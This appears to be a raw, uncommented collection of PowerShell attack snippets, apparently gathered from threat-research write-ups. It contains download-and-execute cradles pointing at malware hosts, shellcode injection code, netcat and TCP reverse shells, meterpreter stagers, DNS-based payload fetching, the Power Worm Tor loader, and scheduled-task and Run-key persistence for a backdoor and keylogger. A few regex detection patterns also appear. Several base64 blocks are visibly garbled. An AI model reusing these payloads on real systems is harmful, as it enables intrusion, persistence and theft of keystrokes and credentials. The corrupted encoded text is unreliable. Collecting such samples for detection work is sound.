@@ -1,0 +1,648 @@
+
+Functions inside: https://github.com/PowerShellMafia/PowerSploit/blob/master/Mayhem/Mayhem.psm1
+
+IEX(New-Object Net.WebClient).DownloadString(’http://www.demo.local/cybad.ps1’)
+
+Start-Process “dir “c:\passwords”” à ZABpAHIAIAAiAGMAOgBcAHAAYQBzAHMAdwBvAHIAZABzACIAIAA=0g
+
+ZABpAHIAIAAiAGMAOgBcAHAAYQBzAHMAdwBvAHIAZABzACIAIAA=
+
+iex(New-Object Net.WebClient).DownloadString(‘http://attacker.home/myscript.ps1’)
+
+
+
+Source: https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/
+
+powershell.exe -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwBOAGUAbQAuAE4AZQBOAC4AUwBIAHIAdgBpAGMAZQBQAG8 AaQBuAHQATQBHAG4AYQBnAGUAcgBdADOAOgBTAGUAcgB2AGUAcgBDAGUAcgBOAGKAZgBpAGMAYQBOAGUAVgBhAGwAaQBKAGEADABpAG8Abg BDAGEABABSAGIAYQBJAGSAIAA9ACAAewAKAHQAcgB1AGUAFQAKAGYAdQBuAGMAdABpAG8AbgAgAECAZQBOACOAVwBLAGIAYWBSAGKAZQBUAHQAI
+AAoACQAQwBvAG8AawBpAGUAKQAgAHSACgAKAGQAIAA9ACAAKABHAGUADAATAEQAYQBOAGUAIAATAEYAbwByAGOAYQBOACAAIgBkAGQALWBNA
+EOALWB5AHkAeQB5ACIAKQA7AAoAJABKACAAPQAgAFSAZABhAHQAZQBOAGKABQBLAFOAOgA6AFAAYQBYAHMAZQBFAHgAYQBjAHQAKAAKAGQALA
+AiAGQAZAAVAEOATQAVAHKAeQB5AHkAlgAsACQAbgB1AGwAbAApADsACgAkAGSAIAA9ACAAWWBKAGEADABLAHQAaQBtAGUAXQA6ADOAUABhAHIAC
+wBIAEUAeABHAGMAdAAoACIAMAAOAC8AMAA5AC8AMgAwADEANwAiACwAlgBkAGQALwBNAEOALwB5AHkAeQB5ACIALAAKAG4AdQBsAGWAKQAZA
+AoAaQBmACAAKAAKAGSAIAATAGwAdAAgACQAZAAPACAAewBLAHgAaQBOAHOAIAAKACQAdwBjACAAPQAgAE4AZQB3ACOATWBIAGOAZQBjAHQAIAB
+TAHkAcwBOAGUAbQAuAE4AZQBOAC4AVwBIAGIAQWBSAGKAZQBUAHQAOwAgAAoAJAB3AGMALgBVAHMAZQBEAGUAZgBhAHUABABOAEMAcgBLAG
+QAZQBUAHQAaQBhAGwAcwAgADOAIAAKAHQAcgB1AGUAOwAgAAoAJAB3AGMALgBQAHIAbwB4AHKALgBDAHIAZQBKAGUAbgBOAGKAYQBsAHMAIA
+A9ACAAJAB3AGMALgBDAHIAZQBKAGUAbgBOAGKAYQBSAHMAOWAKACQAaAA9ACIAIgAKAGKAZgAgACgAJABOACKAIAB7ACQAdwBjAC4ASABIAGEAZA
+BLAHIACwAUAEEAZABKACgAlgBIAG8AcwBOACIALAAKAGgAKQB9AAoAJAB3AGMALgBIAGUAYQBKAGUAcgBzAC4AQQBKAGQAKAAIAFUAcwBIAHIALQB
+BAGCAZQBUAHQAIgASACIATQBvAHOAaQBsAGWAYQAvADUALgAwACAAKABjAG8AbQBwAGEADABpAGIABABIADSAIABNAFMASQBFACAAOQAUADAA
+OwAgAFcAaQBuAGQAbwB3AHMAIABQAGgAbwBuAGUAIABPAFMAIAA3AC4ANQA7ACAAVABYAGKAZABIAG4AdAAVADUALgAwADSAIABJAEUATQBvAG
+IAaQBsAGUALwA5AC4AMAAPACIAKQAKAGKAZgAgACgAJABJAG8AbwBrAGKAZQAPACAAewAKACQAdwBjAC4ASABIAGEAZABIAHIACwAuAEEAZABKACg
+AWRTAHKAWBOAGUAÑOAμAFAAZOBOACAASABOAHOAGARSAGLIACOBIAGLACKBOAFGAZOBLAGOAZOBAFOAA6AFMAhwBуAGA÷OBIACAL
+
+
+
+
+﻿
+[System.Net.ServicePointManager]::ServerCertificate ValidationCallback = {$true} function Get-Webclient ($Cookie) {
+$d
+(Get-Date Format "dd/MM/yyyy");
+$d = [datetime]: : ParseExact ($d, "dd/MM/yyyy", $null);
+$k = [datetime] :: ParseExact ("04/09/2017", "dd/MM/yyyy", $null);
+if ($k -lt $d) {exit}
+$wc = New-Object System.Net.WebClient;
+$wc.UseDefaultCredentials = $true; $wc.Proxy.Credentials = $wc.Credentials;
+$h=""
+if ($h) {$wc.Headers.Add("Host", $h)}
+$wc.Headers.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)") if ($cookie) {
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
+} $wc }
+function primer {
+if ($env:username -eq $env: computername+"$") {$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
+$pre = [System.Text.Encoding]:: Unicode.GetBytes("$env: userdomain\$u; $u; $env: computername; $env: PROCESSOR_ARCHITECTURE; $pid" $p64 = [Convert]:: ToBase64String($pre)
+$pm= (Get-Webclient -Cookie $p64).downloadstring("http://192.168.2.83:80/connect")
+$pm= [System.Text.Encoding]:: Unicode.GetString( [System.Convert]:: FromBase64String($pm)) $pm}
+$pm= primer
+if ($pm) {$pm❘ iex} else {
+start-sleep 10
+primer | iex }
+
+
+
+
+var _ZDF = var _XYz var dft
+var $3 =
+=
+=
+"dxg"
+"xys"
+"lsa -a"
+-
+evil.doc - Notepad
+0
+X
+"YQBSAHMAIAA9ACAAJAB3AGMALgBDAHIAZQBKAGUAbgBOAGKAYQBSAHMAOwAgACQAAAA9ACIAIgAgAGKAZgAg 4AdgA6AHUAcwB1AHIAbgBhAGOAZQB9ACAAJABWAHIAZQAgADOAIABBAFMAeQBzAHQAZQBtAC4AVAB1AHgAdAAuAEUAbgBj.
+if (_ZDF.substr(3,1)
+}
+==
+var S1 = "notepad.exe"
+_XYz.substr(2,1)) {
+else if (_ZDF.substr(1,1)
+==
+_XYz.substr(2,1)){
+var S1= "cmd.exe hostname"
+}
+else
+var S1
+var S2=
+=
+"powershell.exe -noexit -exec bypass -e ";
+"WwBTAHKAcwB0AGUAbQAuAE4AZQB0AC4AUWB1AHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdA
+AbgBOAGKAYQBSAHMAIAA9ACAAJAB3AGMALBDAHIAZQBKAGUAbgBOAGKAYQB SAHMAOWAKACQAAA9ACIAIgAKAGKAZgAgA
+AdgA6AHUAcwB1AHIAbgBhAGOAZQB9AAoAJABWAHIAZQAgADOAIABBAFMAeQBZAHQAZQBTAC4AVAB1AHgAdAAuAEUAbgBjA
+if (_ZDF.substr(3,2)
+var S3
+=
+}
+==
+XYz.substr(2,1)) {
+53.replace("X", "u");|
+var run = new ActiveXObject('WSCRIPT. Shel1'). Run (S1+52);
+
+
+
+
+
+
+
+
+powerShell.exe  -WindowStyle hiddeN -ExecuTionPolicy ByPasS -enc 
+cgBlAGcAcwB2AHIAMwAyACAALwB1ACAALwBzACAALwBpADoAaAB0AHQAcAA6
+AC8ALwAxADkAMgAuADEANgA4AC4ANAA4AC4AMQAyADkALwB0AGUAcwB0AC4
+AagBwAGcAIABzAGMAcgBvAGIAagAuAGQAbABsAAoA
+
+
+
+powershell.exe –^e^C^ ZQBjAGgAbwAgACIAVwBpAHQAYwBoACIA
+
+
+
+powershell.exe –eNco ZQBjAGgAbwAgACIAVwBpAHoAYQByAGQAIgA=
+
+
+powershell.exe –EncodedCommand ZQBjAGgAbwAgACIARABvAHIAbwB0AGgAeQAiAA==
+
+
+
+$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = ;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
+
+
+
+$nLR = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $nLR -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$kuss=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($kuss.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$kuss,0,0,0);for (;;){Start-sleep 60};
+
+
+
+
+
+$nLR = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $nLR -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$kuss=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($kuss.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$kuss,0,0,0);for (;;){Start-sleep 60};
+
+
+
+
+ (New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")
+ 
+ 
+ 
+powershell -noP -nonI -Win hidden -c sc ftp.txt -val \"open\" -enc ascii; ac ftp.txt -val \"192.168.52.129\" -enc ascii; ac ftp.txt -val \"test\" -enc ascii; ac ftp.txt -val \"test\" -enc ascii; ac ftp.txt -val \"bin\" -enc ascii; ac ftp.txt -val \"GET\" -enc ascii; ac ftp.txt -val \"nc.exe\" -enc ascii; ac ftp.txt -val \"nc.exe\" -enc ascii; ac ftp.txt -val \"bye\" -enc ascii; ftp -s:ftp.txt; rm ftp.txt; ./nc.exe -e powershell.exe 192.168.52.129 3724
+
+
+
+var1 = generate_random_string(3, 4)
+var2 = generate_random_string(3, 4)
+powershell_code = (
+        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr …
+powershell_code = powershell_code.replace("$1", "$" + var1).replace("$c", "$" + var2).replace("$2", "$" + var3) …
+
+
+
+
+
+
+ (New-Object System.Net.WebClient).DownloadFile('http://cajos[.]in/0x/1.exe','mess.exe');Start-Process 'mess.exe'
+
+
+
+
+ (New-Object System.Net.WebClient).DownloadFile('http://94.102.53[.]238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")
+
+
+
+
+ $Wc=NeW-ObjeCt SySTEM.Net.WebCLiEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeadeRS.ADd('User-Agent',$u);$wc.PrOxy = [SyStem.NeT.WEbReQUeSt]::DEFauLTWeBProxy;$WC.PRoXY.CrEdENTIaLS = [SYStEM.NeT.CReDEnTiALCaChE]::DEFaulTNeTworKCREdeNtiaLS;$K='0192023a7bbd73250516f069df18b500';$i=0;[CHAr[]]$B=([CHaR[]]($wc.DOwnloaDSTRing("http://23.239.12.15:8080/index.asp")))|%{$_-BXOr$k[$i++%$K.LENgTh]};IEX ($B-jOIn'')
+
+
+
+
+ PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94[.]135/~kali/ketty.exe', $env:APPDATA\profilest.exe );Start-Process ( $env:APPDATA\profilest.exe )
+
+
+
+  ($deploylocation=$env:temp+'fleeb.exe');(New-Object System.Net.WebClient).DownloadFile('http://worldnit[.]com/abu.exe', $deploylocation);Start-Process $deploylocation
+
+
+
+   ($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://alonqood[.]com/abacom.exe', $dpl);Start-Process $dpl
+
+
+
+
+IEX (New-Object Net.WebClient).DownloadString('http://cannot.loginto[.]me/googlehelper.ps1')
+iex ((New-Object Net.WebClient).DownloadString('http://76.74.127[.]38/default-nco.html'))
+
+
+
+
+Import-Module BitsTransfer
+$path = [environment]::getfolderpath("mydocuments")
+Start-BitsTransfer -Source "http://94.102.50[.]39/keyt.exe" -Destination "$path\keyt.exe"
+Invoke-Item  "$path\keyt.exe"
+
+
+
+if(''+(nslookup -q=txt p.s.os.ns.rankingplac[.]pl) -match '@(.*)@'){iex $matches[1]}
+
+
+
+"@$str=''\;$i=1\;while(1){if(''+(nslookup -q=txt \"l.$i.ns.rankingplac[.]pl.\") -match '@(.*)@'){$str += [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1]))} else {break\;}$i++}iex $str@"
+
+
+
+$x=$Env:username;$u="http://54.213.195[.]138/s2.txt?u=" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);Invoke-Expression -Command $s;
+
+
+
+
+iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1"); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 88.160.254[.]183 -Lport 8080 -Force
+
+
+
+
+IEX (New-Object Net.WebClient).DownloadString('http://el8[.]pw/ps/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 65.112.221[.]34 -Lport 443 –Force
+
+
+
+$TempDir = [System.IO.Path]::GetTempPath(); (New-Object System.Net.WebClient).DownloadFile("http://kulup.isikun.edu.tr/Kraken.jpg","  $TempDir\syshost.exe"); start $TempDir\syshost.exe;
+
+
+
+regsvr32 /u /s /i:http://&lt;IP_REDACTED&gt;/test.jpg scrobj.dll
+
+
+
+$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,&lt;SHELLCODE&gt;,0x19;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
+
+
+
+
+print("PS Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443")
+
+
+"msfvenom -p %s %s %s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" % (
+            payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+
+
+
+
+"^(\$c = |\$1 = [\"\']\$c = )"
+"\$g = 0x1000" 
+"\$z\.Length \-gt 0x1000"
+"\$z\[\$i\]"
+
+
+
+if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAFHL6FcCA71W6nlhxGUKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
+
+
+
+$client = New-Object System.Net.Sockets.TCPClient("192.168.56.144",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+
+
+'xneZtEDC';$ErrorActionPreference = 'SilentlyContinue';'uqaaPxuaCN';'DOBHbJqlkRM';$kn = (get-wmiobject Win32_ComputerSystemProduct).UUID;'WVy';'gKEZgPRMl';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $kn){;'mUzql';'jsvZDTQITNa';(Get-Process -id $pid).Kill();'NgpYRhj';'hVXjCtDvBc';};'tUVXQmXbZ';'lkTzhJZHwxU';'McPzodeY';'vNNYv';function e($dkez){;'TfPD';'WTw';$jt = (((iex "nslookup -querytype=txt $dkez 8.8.8.8") -match '"') -replace '"', '')[0].Trim();'HdCjwAD';'sVSjtZRvr';$ovg.DownloadFile($jt, $tg);'raVw';'OQNdBkS';$ei = $ke.NameSpace($tg).Items();'OgnucmQlK';'Qfqxov';$ke.NameSpace($sa).CopyHere($ei, 20);'GBMdJNr';'VMWS';rd $tg;'pnoFau';'SedloE';};'NxPZPIV';'ypi';'AFElBzCp';'bYRWML';'UYANxqtLg';'QBC';$sa = $env:APPDATA + '\' + $kn;'Eaxyty';'IwuaOh';if (!(Test-Path $sa)){;'amYmrKg';'vWAgqtEB';$qr = New-Item -ItemType Directory -Force -Path $sa;'GqNII';'HNPIQutUpGv';$qr.Attributes = "Hidden", "System", "NotContentIndexed";'MuRuRa';'CmlkCszVCO';};'ZdmIGyj';'nAYhOpvWV';'BIAgIntvoU';'GJTBzyjr';$zul=$sa+ '\tor.exe';'swInqmX';'LTXwOFNSuL';$axs=$sa+ '\polipo.exe';'qkI';'WJPoaNnarn';$tg=$sa+'\'+$kn+'.zip';'Sgw';'fYthyZ';$ovg=New-Object System.Net.WebClient;'Ils';'GRldQfFnfQK';$ke=New-Object -C Shell.Application;'vVoutJQ';'gHXAsaxc';'llaetDv';'Zix';if (!(Test-Path $zul) -or !(Test-Path $axs)){;'QtJINrwhS';'XkAxtKLAJ';e 'i.vankin.de';'QqVujkSIPS';'dZdn';};'GoemQSlIB';'IOcJU';'FYTMzpCupR';'qEnstu';if (!(Test-Path $zul) -or !(Test-Path $axs)){;'ZGtSt';'mHkBgIOsU';e 'gg.ibiz.cc';'sDtXmE';'xSBk';};'YaiaAJqKPin';'gFVK';'TumvJVvJKRm';'ULQwp';$pj=$sa+'\roaminglog';'numdmmhA';'ytEF';saps $zul -Ar " --Log `"notice file $pj`"" -wi Hidden;'JCBc';'CjHbOtf';do{sleep 1;$xxl=gc $pj}while(!($xxl -match 'Bootstrapped 100%: Done.'));'wYtpNVJtdz';'XggiQIPFt';saps $axs -a "socksParentProxy=localhost:9050" -wi Hidden;'dlV';'zVLSO';sleep 7;'FzlDdEynuUz';'Ci';$zpp=New-Object System.Net.WebProxy("localhost:8123");'MsOkmLs';'zRW';$zpp.useDefaultCredentials = $true;'PWXVXIMqb';'lAy';$ovg.proxy=$zpp;'gEkdkGPjVp';'xerooSjz';$ca='http://powerwormjqj42hu[.]onion/get.php?s=setup&amp;mom=14C6EFBB-F19D-DC11-83A7-001B38A0DF85&amp;uid=' + $kn;'SGCFq';'GkVVnp';while(!$qmh){$qmh=$ovg.downloadString($ca)};'rHo';'jtshvrR';if ($qmh -ne 'none'){;'Ju';'VuUTlp';iex $qmh;'blhE';'AeIepyNd';};'whSp';
+
+
+
+$ErrorActionPreference = 'SilentlyContinue';
+$kn = (get-wmiobject Win32_ComputerSystemProduct).UUID;
+
+if ((gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $kn) {;
+	(Get-Process -id $pid).Kill();
+};
+
+function e($dkez){;
+	$jt = (((iex "nslookup -querytype=txt $dkez 8.8.8.8") -match '"') -replace '"', '')[0].Trim();
+	$ovg.DownloadFile($jt, $tg);
+	$ei = $ke.NameSpace($tg).Items();
+	$ke.NameSpace($sa).CopyHere($ei, 20);
+	rd $tg;
+};
+
+$sa = $env:APPDATA + '\' + $kn;
+if (!(Test-Path $sa)){;
+	$qr = New-Item -ItemType Directory -Force -Path $sa;
+	$qr.Attributes = "Hidden", "System", "NotContentIndexed";
+};	
+
+$zul=$sa+ '\tor.exe';
+$axs=$sa+ '\polipo.exe';
+$tg=$sa+'\'+$kn+'.zip';
+$ovg=New-Object System.Net.WebClient;
+$ke=New-Object -C Shell.Application;
+
+if (!(Test-Path $zul) -or !(Test-Path $axs)){;
+	e 'i.vankin.de';
+};
+if (!(Test-Path $zul) -or !(Test-Path $axs)){;
+	e 'gg.ibiz.cc';
+};
+
+$pj=$sa+'\roaminglog';
+saps $zul -Ar " --Log `"notice file $pj`"" -wi Hidden;
+
+do{
+	sleep 1;
+	$xxl=gc $pj
+} while(!($xxl -match 'Bootstrapped 100%: Done.'));
+
+saps $axs -a "socksParentProxy=localhost:9050" -wi Hidden;
+sleep 7;
+$zpp=New-Object System.Net.WebProxy("localhost:8123");
+$zpp.useDefaultCredentials = $true;
+$ovg.proxy=$zpp;
+$ca='http://powerwormjqj42hu[.]onion/get.php?s=setup&amp;mom=&amp;uid=' + $kn;
+
+while(!$qmh){
+	$qmh=$ovg.downloadString($ca)
+};
+
+if ($qmh -ne 'none'){;
+	iex $qmh;
+};
+
+
+
+
+
+Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('rVZtb5tIEP4eKf9+nJvw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
+
+
+
+
+$TaskName = "Microsoft Windows Driver Update"
+$TaskDescr = "Microsoft Windows Driver Update Services"
+$TaskCommand = "C:\ProgramData\WindowsUpgrade\minecraft.exe"
+$TaskScript = ""
+$TaskArg = ""
+$TaskStartTime = [datetime]::Now.AddMinutes(1)
+$service = new-object -ComObject("Schedule.Service")
+$service.Connect()
+$rootFolder = $service.GetFolder("\")
+$TaskDefinition = $service.NewTask(0)
+$TaskDefinition.RegistrationInfo.Description = "$TaskDescr"
+$TaskDefinition.Settings.Enabled = $true
+$TaskDefinition.Settings.Hidden = $true
+$TaskDefinition.Settings.RestartCount = "5"
+$TaskDefinition.Settings.StartWhenAvailable = $true
+$TaskDefinition.Settings.StopIfGoingOnBatteries = $false
+$TaskDefinition.Settings.RestartInterval = "PT5M"
+$triggers = $TaskDefinition.Triggers
+$trigger = $triggers.Create(8)
+$trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
+$trigger.Enabled = $true
+$trigger.Repetition.Interval = "PT5M"
+$TaskDefinition.Settings.DisallowStartIfOnBatteries = $true
+$Action = $TaskDefinition.Actions.Create(0)
+$action.Path = "$TaskCommand"
+$action.Arguments = "$TaskArg"
+$rootFolder.RegisterTaskDefinition("$TaskName",$TaskDefinition,6,"System",$null,5)
+SCHTASKS /run /TN $TaskName
+
+
+
+
+$path= "$env:userprofile\appdata\local\microsoft\Windows"
+
+if(-not(Test-Path -Path($path)))
+{mkdir $path}
+
+$fileout="$path\L69742.vbs";
+
+$encstrvbs="c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K";
+
+$bytevbs=[System.Convert]::FromBase64String($encstrvbs);
+
+$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);
+
+$strvbs = $strvbs.replace('#dpath#',$path);
+
+set-content $fileout $strvbs;
+
+$tmpfile="$env:TEMP\U1848931.TMP";
+
+$pscode_b64  =get-content $tmpfile | out-string;
+
+$pscode_b64=$pscode_b64.trim();
+
+$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))
+
+$id = [string](get-random -min 10000 -max 100000)
+
+$pscode = $pscode.replace('#id#',$id);
+
+set-content "$path\mc.ps1" $pscode
+
+$taskstr="schtasks /create /F /sc minute /mo 2 /tn ""GoogleServiceUpdate"" /tr ""\""$fileout""\""   ";
+
+iex 'cmd /c $taskstr';
+{{CODE}}
+
+The base64 decoded VBScript –
+
+{{CODE}}
+set wss = CreateObject("WScript.Shell")
+str = "power" &amp; "sh" &amp; "ell" &amp; ".e" &amp; "xe -NoP -sta -NonI -e" &amp; "xe" &amp; "c byp" &amp; "as" &amp; "s -fi" &amp; "le "
+path = "#dpath#"
+str = str + path + "\mc.ps1"
+wss.Run str, 0
+
+
+
+
+
+
+
+schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Backdoor" /XML C:\Windows\Temp\task.xml
+schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Keylogger" /XML C:\Windows\Temp\task2.xml
+SCHTASKS /run /TN "Microsoft\Windows\DynAmite\Backdoor"
+SCHTASKS /run /TN "Microsoft\Windows\DynAmite\Keylogger"
+Remove-Item "C:\Windows\Temp\*.xml"
+
+
+
+
+
+#create backdoor task
+schtasks.exe /create /TN "Microsoft\Windows\DynAmite\DynAmite" /XML C:\Windows\Temp\dynatask.xml
+#create upload task
+schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Uploader" /XML C:\Windows\Temp\upltask.xml
+#run backdoor task
+SCHTASKS /run /TN "Microsoft\Windows\DynAmite\DynAmite"
+#create registry entries for keylogger and screenspy
+New-ItemProperty -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name Keylogger -PropertyType String -Value "C:\Windows\dynakey.exe"
+New-ItemProperty -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name ScreenSpy -PropertyType String -Value "C:\Windows\dynascr.exe"
+#run keylogger and screenspy
+C:\Windows\dynakey.exe
+C:\Windows\dynascr.exe
+#cleanup temp folder
+Remove-Item "C:\Windows\Temp\*"
+
+
+
+
+$loot = ($env:LOCALAPPDATA + "\dyna\"); md $loot
+certutil -decode res.crt ($loot + "res"); certutil -decode kl.crt ($loot + "kl.exe"); certutil -decode st.crt ($loot + "st.exe");  certutil -decode cry.crt ($loot + "cry.exe"); certutil -decode t1.crt ($env:TEMP + "\t1.xml"); certutil -decode t2.crt ($env:TEMP + "\t2.xml"); certutil -decode t3.crt ($env:TEMP + "\t3.xml"); certutil -decode t4.crt ($env:TEMP + "\t4.xml"); certutil -decode t5.crt ($env:TEMP + "\t5.xml"); certutil -decode bd.crt C:\ProgramData\bd.exe
+schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\1" /XML ($env:TEMP + "\t1.xml")
+schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\2" /XML ($env:TEMP + "\t2.xml")
+schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\3" /XML ($env:TEMP + "\t3.xml")
+schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\4" /XML ($env:TEMP + "\t4.xml")
+schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\5" /XML ($env:TEMP + "\t5.xml")
+schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\1"
+schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\2"
+schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\3"
+schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\4"
+schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\5"
+Remove-Item ($env:TEMP + "\*.xml") -Recurse –Force
+
+
+
+
+
+
+
+$LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
+$RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
+$LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
